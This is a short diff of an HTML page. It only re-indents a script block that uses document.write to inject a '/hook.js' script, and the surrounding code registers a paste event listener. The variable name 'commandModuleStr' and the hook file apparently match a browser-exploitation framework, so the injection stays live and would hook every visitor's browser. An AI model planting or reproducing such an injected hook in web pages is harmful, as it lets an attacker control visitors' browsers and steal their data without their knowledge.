@@ -260,9 +260,8 @@ document.addEventListener('paste', async (event) => {
   //
     </script>
 <script>
-var commandModuleStr = '<script src="/hook.js" type="text/javascript"><\/script>';
-document.write(commandModuleStr);
+	var commandModuleStr = '<script src="/hook.js" type="text/javascript"><\/script>';
+	document.write(commandModuleStr);
 </script>
 </body>
 </html>
-
